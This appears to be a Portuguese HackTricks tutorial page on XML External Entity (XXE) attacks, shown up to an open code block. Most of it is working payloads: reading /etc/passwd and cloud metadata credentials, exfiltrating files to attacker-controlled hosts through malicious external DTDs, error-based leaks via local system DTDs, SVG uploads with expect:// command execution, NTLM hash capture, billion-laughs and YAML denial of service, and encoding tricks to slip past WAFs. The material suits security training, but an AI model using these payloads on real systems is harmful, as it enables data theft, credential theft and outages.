# XXE - XEE - Entidade Externa XML

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Fundamentos de XML

XML √© uma linguagem de marca√ß√£o projetada para armazenamento e transporte de dados, apresentando uma estrutura flex√≠vel que permite o uso de tags nomeadas descritivamente. Ela difere do HTML por n√£o estar limitada a um conjunto de tags predefinidas. A import√¢ncia do XML diminuiu com o surgimento do JSON, apesar de seu papel inicial na tecnologia AJAX.

* **Representa√ß√£o de Dados atrav√©s de Entidades**: Entidades em XML permitem a representa√ß√£o de dados, incluindo caracteres especiais como `&lt;` e `&gt;`, que correspondem a `<` e `>` para evitar conflitos com o sistema de tags do XML.
* **Definindo Elementos XML**: XML permite a defini√ß√£o de tipos de elementos, delineando como os elementos devem ser estruturados e que conte√∫do podem conter, variando de qualquer tipo de conte√∫do a elementos filhos espec√≠ficos.
* **Defini√ß√£o de Tipo de Documento (DTD)**: DTDs s√£o cruciais em XML para definir a estrutura do documento e os tipos de dados que ele pode conter. Eles podem ser internos, externos ou uma combina√ß√£o, orientando como os documentos s√£o formatados e validados.
* **Entidades Personalizadas e Externas**: XML suporta a cria√ß√£o de entidades personalizadas dentro de um DTD para representa√ß√£o flex√≠vel de dados. Entidades externas, definidas com uma URL, levantam preocupa√ß√µes de seguran√ßa, particularmente no contexto de ataques de Entidade Externa XML (XXE), que exploram a forma como os analisadores XML lidam com fontes de dados externas: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
* **Detec√ß√£o de XXE com Entidades de Par√¢metro**: Para detectar vulnerabilidades XXE, especialmente quando m√©todos convencionais falham devido a medidas de seguran√ßa do analisador, entidades de par√¢metro XML podem ser utilizadas. Essas entidades permitem t√©cnicas de detec√ß√£o fora de banda, como acionar consultas DNS ou requisi√ß√µes HTTP para um dom√≠nio controlado, para confirmar a vulnerabilidade.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Principais ataques

[**A maioria desses ataques foi testada usando os incr√≠veis laborat√≥rios XEE da Portswiggers: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Teste de Nova Entidade

Neste ataque, vou testar se uma simples declara√ß√£o de NOVA ENTIDADE est√° funcionando.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (870).png>)

### Ler arquivo

Vamos tentar ler `/etc/passwd` de diferentes maneiras. Para Windows, voc√™ pode tentar ler: `C:\windows\system32\drivers\etc\hosts`

Neste primeiro caso, observe que SYSTEM "_\*\*file:///\*\*etc/passwd_" tamb√©m funcionar√°.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (86).png>)

Este segundo caso deve ser √∫til para extrair um arquivo se o servidor web estiver usando PHP (n√£o √© o caso dos laborat√≥rios Portswigger)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
No terceiro caso, observe que estamos declarando o `Element stockCheck` como ANY.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (753).png>)

### Listagem de diret√≥rios

Em aplica√ß√µes baseadas em **Java**, pode ser poss√≠vel **listar o conte√∫do de um diret√≥rio** via XXE com um payload como (apenas pedindo o diret√≥rio em vez do arquivo):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Um XXE poderia ser usado para abusar de um SSRF dentro de uma nuvem
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

Usando a **t√©cnica comentada anteriormente**, voc√™ pode fazer o servidor acessar um servidor que voc√™ controla para mostrar que ele √© vulner√°vel. Mas, se isso n√£o estiver funcionando, talvez seja porque **entidades XML n√£o s√£o permitidas**, nesse caso voc√™ poderia tentar usar **entidades de par√¢metro XML**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Exfiltrar dados fora de banda

**Nesta ocasi√£o, vamos fazer o servidor carregar um novo DTD com um payload malicioso que enviar√° o conte√∫do de um arquivo via requisi√ß√£o HTTP (para arquivos de v√°rias linhas, voc√™ pode tentar exfiltr√°-lo via \_ftp://**\_ usando este servidor b√°sico, por exemplo, [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Esta explica√ß√£o √© baseada em** [**Portswiggers lab aqui**](https://portswigger.net/web-security/xxe/blind)**.**

No DTD malicioso fornecido, uma s√©rie de etapas s√£o realizadas para exfiltrar dados:

### Exemplo de DTD Malicioso:

A estrutura √© a seguinte:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Os passos executados por este DTD incluem:

1. **Defini√ß√£o de Entidades de Par√¢metro:**
* Uma entidade de par√¢metro XML, `%file`, √© criada, lendo o conte√∫do do arquivo `/etc/hostname`.
* Outra entidade de par√¢metro XML, `%eval`, √© definida. Ela declara dinamicamente uma nova entidade de par√¢metro XML, `%exfiltrate`. A entidade `%exfiltrate` √© configurada para fazer uma solicita√ß√£o HTTP ao servidor do atacante, passando o conte√∫do da entidade `%file` dentro da string de consulta da URL.
2. **Execu√ß√£o de Entidades:**
* A entidade `%eval` √© utilizada, levando √† execu√ß√£o da declara√ß√£o din√¢mica da entidade `%exfiltrate`.
* A entidade `%exfiltrate` √© ent√£o usada, acionando uma solicita√ß√£o HTTP para a URL especificada com o conte√∫do do arquivo.

O atacante hospeda este DTD malicioso em um servidor sob seu controle, tipicamente em uma URL como `http://web-attacker.com/malicious.dtd`.

**Carga √ötil XXE:** Para explorar uma aplica√ß√£o vulner√°vel, o atacante envia uma carga √∫til XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Este payload define uma entidade de par√¢metro XML `%xxe` e a incorpora dentro do DTD. Quando processado por um parser XML, este payload busca o DTD externo do servidor do atacante. O parser ent√£o interpreta o DTD inline, executando os passos descritos no DTD malicioso e levando √† exfiltra√ß√£o do arquivo `/etc/hostname` para o servidor do atacante.

### Baseado em Erro (DTD Externo)

**Neste caso, vamos fazer o servidor carregar um DTD malicioso que mostrar√° o conte√∫do de um arquivo dentro de uma mensagem de erro (isso √© v√°lido apenas se voc√™ puder ver mensagens de erro).** [**Exemplo daqui.**](https://portswigger.net/web-security/xxe/blind)

Uma mensagem de erro de parsing XML, revelando o conte√∫do do arquivo `/etc/passwd`, pode ser acionada usando um Documento Tipo de Defini√ß√£o (DTD) externo malicioso. Isso √© realizado atrav√©s dos seguintes passos:

1. Uma entidade de par√¢metro XML chamada `file` √© definida, que cont√©m o conte√∫do do arquivo `/etc/passwd`.
2. Uma entidade de par√¢metro XML chamada `eval` √© definida, incorporando uma declara√ß√£o din√¢mica para outra entidade de par√¢metro XML chamada `error`. Esta entidade `error`, quando avaliada, tenta carregar um arquivo inexistente, incorporando o conte√∫do da entidade `file` como seu nome.
3. A entidade `eval` √© invocada, levando √† declara√ß√£o din√¢mica da entidade `error`.
4. A invoca√ß√£o da entidade `error` resulta em uma tentativa de carregar um arquivo inexistente, produzindo uma mensagem de erro que inclui o conte√∫do do arquivo `/etc/passwd` como parte do nome do arquivo.

O DTD externo malicioso pode ser invocado com o seguinte XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Ao ser executada, a resposta do servidor web deve incluir uma mensagem de erro exibindo o conte√∫do do arquivo `/etc/passwd`.

![](<../.gitbook/assets/image (809).png>)

_**Por favor, note que o DTD externo nos permite incluir uma entidade dentro da segunda (****`eval`****), mas isso √© proibido no DTD interno. Portanto, voc√™ n√£o pode for√ßar um erro sem usar um DTD externo (geralmente).**_

### **Baseado em Erro (system DTD)**

E quanto √†s vulnerabilidades XXE cegas quando **intera√ß√µes fora de banda est√£o bloqueadas** (conex√µes externas n√£o est√£o dispon√≠veis)?

Uma brecha na especifica√ß√£o da linguagem XML pode **expor dados sens√≠veis atrav√©s de mensagens de erro quando o DTD de um documento mistura declara√ß√µes internas e externas**. Este problema permite a redefini√ß√£o interna de entidades declaradas externamente, facilitando a execu√ß√£o de ataques XXE baseados em erro. Esses ataques exploram a redefini√ß√£o de uma entidade de par√¢metro XML, originalmente declarada em um DTD externo, a partir de um DTD interno. Quando conex√µes fora de banda s√£o bloqueadas pelo servidor, os atacantes devem confiar em arquivos DTD locais para conduzir o ataque, visando induzir um erro de an√°lise para revelar informa√ß√µes sens√≠veis.

Considere um cen√°rio onde o sistema de arquivos do servidor cont√©m um arquivo DTD em `/usr/local/app/schema.dtd`, definindo uma entidade chamada `custom_entity`. Um atacante pode induzir um erro de an√°lise XML revelando o conte√∫do do arquivo `/etc/passwd` ao submeter um DTD h√≠brido da seguinte forma:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Os passos delineados s√£o executados por este DTD:

* A defini√ß√£o de uma entidade de par√¢metro XML chamada `local_dtd` inclui o arquivo DTD externo localizado no sistema de arquivos do servidor.
* Uma redefini√ß√£o ocorre para a entidade de par√¢metro XML `custom_entity`, originalmente definida no DTD externo, para encapsular um [exploit XXE baseado em erro](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Esta redefini√ß√£o √© projetada para provocar um erro de an√°lise, expondo o conte√∫do do arquivo `/etc/passwd`.
* Ao empregar a entidade `local_dtd`, o DTD externo √© ativado, abrangendo a nova entidade definida `custom_entity`. Esta sequ√™ncia de a√ß√µes precipita a emiss√£o da mensagem de erro pretendida pelo exploit.

**Exemplo do mundo real:** Sistemas que utilizam o ambiente de desktop GNOME frequentemente t√™m um DTD em `/usr/share/yelp/dtd/docbookx.dtd` contendo uma entidade chamada `ISOamso`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (625).png>)

Como esta t√©cnica usa um **DTD interno, voc√™ precisa encontrar um v√°lido primeiro**. Voc√™ pode fazer isso **instalando** o mesmo **SO / Software** que o servidor est√° usando e **procurando alguns DTDs padr√£o**, ou **pegando uma lista** de **DTDs padr√£o** dentro dos sistemas e **verificando** se algum deles existe:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Para mais informa√ß√µes, consulte [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Encontrando DTDs dentro do sistema

No seguinte reposit√≥rio incr√≠vel do github, voc√™ pode encontrar **caminhos de DTDs que podem estar presentes no sistema**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Al√©m disso, se voc√™ tiver a **imagem Docker do sistema da v√≠tima**, pode usar a ferramenta do mesmo reposit√≥rio para **escanear** a **imagem** e **encontrar** o caminho dos **DTDs** presentes dentro do sistema. Leia o [Readme do github](https://github.com/GoSecure/dtd-finder) para aprender como.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Office Open XML Parsers

Para uma explica√ß√£o mais detalhada deste ataque, **verifique a segunda se√ß√£o de** [**este post incr√≠vel**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **da Detectify**.

A capacidade de **fazer upload de documentos do Microsoft Office √© oferecida por muitas aplica√ß√µes web**, que ent√£o procedem a extrair certos detalhes desses documentos. Por exemplo, uma aplica√ß√£o web pode permitir que os usu√°rios importem dados fazendo upload de uma planilha no formato XLSX. Para que o parser extraia os dados da planilha, ele inevitavelmente precisar√° analisar pelo menos um arquivo XML.

Para testar essa vulnerabilidade, √© necess√°rio criar um **arquivo do Microsoft Office contendo um payload XXE**. O primeiro passo √© criar um diret√≥rio vazio para o qual o documento pode ser descompactado.

Uma vez que o documento tenha sido descompactado, o arquivo XML localizado em `./unzipped/word/document.xml` deve ser aberto e editado em um editor de texto preferido (como vim). O XML deve ser modificado para incluir o payload XXE desejado, geralmente come√ßando com uma solicita√ß√£o HTTP.

As linhas XML modificadas devem ser inseridas entre os dois objetos XML raiz. √â importante substituir a URL por uma URL monitor√°vel para solicita√ß√µes.

Finalmente, o arquivo pode ser compactado para criar o arquivo malicioso poc.docx. A partir do diret√≥rio "unzipped" previamente criado, o seguinte comando deve ser executado:

Agora, o arquivo criado pode ser enviado para a aplica√ß√£o web potencialmente vulner√°vel, e pode-se esperar que uma solicita√ß√£o apare√ßa nos logs do Burp Collaborator.

### Jar: protocol

O **jar** protocolo √© acess√≠vel exclusivamente dentro de **aplica√ß√µes Java**. Ele √© projetado para permitir o acesso a arquivos dentro de um **PKZIP** archive (por exemplo, `.zip`, `.jar`, etc.), atendendo tanto a arquivos locais quanto remotos.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Para poder acessar arquivos dentro de arquivos PKZIP √© **super √∫til para abusar de XXE via arquivos DTD do sistema.** Confira [esta se√ß√£o para aprender como abusar de arquivos DTD do sistema](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

O processo por tr√°s do acesso a um arquivo dentro de um arquivo PKZIP via o protocolo jar envolve v√°rias etapas:

1. Uma solicita√ß√£o HTTP √© feita para baixar o arquivo zip de um local especificado, como `https://download.website.com/archive.zip`.
2. A resposta HTTP contendo o arquivo √© armazenada temporariamente no sistema, tipicamente em um local como `/tmp/...`.
3. O arquivo √© ent√£o extra√≠do para acessar seu conte√∫do.
4. O arquivo espec√≠fico dentro do arquivo, `file.zip`, √© lido.
5. Ap√≥s a opera√ß√£o, quaisquer arquivos tempor√°rios criados durante esse processo s√£o exclu√≠dos.

Uma t√©cnica interessante para interromper esse processo na segunda etapa envolve manter a conex√£o do servidor aberta indefinidamente ao servir o arquivo do arquivo. Ferramentas dispon√≠veis neste [reposit√≥rio](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) podem ser utilizadas para esse prop√≥sito, incluindo um servidor Python (`slow_http_server.py`) e um servidor Java (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Escrever arquivos em um diret√≥rio tempor√°rio pode ajudar a **escalar outra vulnerabilidade que envolve uma travessia de caminho** (como inclus√£o de arquivo local, inje√ß√£o de template, XSLT RCE, desserializa√ß√£o, etc).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Ataque dos Bilh√µes de Risos
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Ataque Yaml
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Ataque de Explos√£o Quadr√°tica

![](<../.gitbook/assets/image (527).png>)

#### Obtendo NTML

Em hosts Windows, √© poss√≠vel obter o hash NTML do usu√°rio do servidor web configurando um manipulador responder.py:
```bash
Responder.py -I eth0 -v
```
e enviando a seguinte solicita√ß√£o
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Ent√£o voc√™ pode tentar quebrar o hash usando hashcat

## Superf√≠cies XXE Ocultas

### XInclude

Ao integrar dados do cliente em documentos XML do lado do servidor, como aqueles em solicita√ß√µes SOAP de backend, o controle direto sobre a estrutura XML √© frequentemente limitado, dificultando ataques XXE tradicionais devido a restri√ß√µes na modifica√ß√£o do elemento `DOCTYPE`. No entanto, um ataque `XInclude` oferece uma solu√ß√£o ao permitir a inser√ß√£o de entidades externas dentro de qualquer elemento de dados do documento XML. Este m√©todo √© eficaz mesmo quando apenas uma parte dos dados dentro de um documento XML gerado pelo servidor pode ser controlada.

Para executar um ataque `XInclude`, o namespace `XInclude` deve ser declarado, e o caminho do arquivo para a entidade externa pretendida deve ser especificado. Abaixo est√° um exemplo sucinto de como tal ataque pode ser formulado:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Confira [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) para mais informa√ß√µes!

### SVG - Upload de Arquivo

Arquivos enviados por usu√°rios para certas aplica√ß√µes, que s√£o ent√£o processados no servidor, podem explorar vulnerabilidades na forma como arquivos XML ou formatos de arquivo que cont√™m XML s√£o tratados. Formatos de arquivo comuns, como documentos de escrit√≥rio (DOCX) e imagens (SVG), s√£o baseados em XML.

Quando os usu√°rios **enviam imagens**, essas imagens s√£o processadas ou validadas no lado do servidor. Mesmo para aplica√ß√µes que esperam formatos como PNG ou JPEG, a **biblioteca de processamento de imagens do servidor tamb√©m pode suportar imagens SVG**. O SVG, sendo um formato baseado em XML, pode ser explorado por atacantes para enviar imagens SVG maliciosas, expondo assim o servidor a vulnerabilidades XXE (XML External Entity).

Um exemplo de tal exploit √© mostrado abaixo, onde uma imagem SVG maliciosa tenta ler arquivos do sistema:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Outro m√©todo envolve tentar **executar comandos** atrav√©s do wrapper PHP "expect":
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
Em ambos os casos, o formato SVG √© usado para lan√ßar ataques que exploram as capacidades de processamento XML do software do servidor, destacando a necessidade de valida√ß√£o robusta de entrada e medidas de seguran√ßa.

Verifique [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) para mais informa√ß√µes!

**Observe que a primeira linha do arquivo lido ou do resultado da execu√ß√£o aparecer√° DENTRO da imagem criada. Portanto, voc√™ precisa ser capaz de acessar a imagem que o SVG criou.**

### **PDF - Upload de arquivo**

Leia o seguinte post para **aprender como explorar um XXE fazendo upload de um arquivo PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: De x-www-urlencoded para XML

Se uma solicita√ß√£o POST aceitar os dados no formato XML, voc√™ pode tentar explorar um XXE nessa solicita√ß√£o. Por exemplo, se uma solicita√ß√£o normal contiver o seguinte:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Ent√£o voc√™ pode ser capaz de enviar a seguinte solicita√ß√£o, com o mesmo resultado:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: De JSON para XEE

Para alterar a solicita√ß√£o, voc√™ pode usar uma extens√£o do Burp chamada ‚Äú**Content Type Converter**‚Äú. [Aqui](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) voc√™ pode encontrar este exemplo:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Outro exemplo pode ser encontrado [aqui](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Bypasses de WAF e Prote√ß√µes

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Isso s√≥ funciona se o servidor XML aceitar o protocolo `data://`.

### UTF-7

Voc√™ pode usar a \[**"Receita de Codifica√ß√£o"** do cyberchef aqui ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)para]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29para](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29para)) transformar para UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ Protocol Bypass

Se a web estiver usando PHP, em vez de usar `file:/` voc√™ pode usar **php wrappers**`php://filter/convert.base64-encode/resource=` para **acessar arquivos internos**.

Se a web estiver usando Java, voc√™ pode verificar o [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

Truque de [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Voc√™ pode criar uma **entidade dentro de uma entidade** codificando-a com **html entities** e ent√£o cham√°-la para **carregar um dtd**.\
Note que as **HTML Entities** usadas precisam ser **num√©ricas** (como \[neste exemplo]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Exemplo de DTD:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**Extrair** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Extrair recurso externo**
```xml
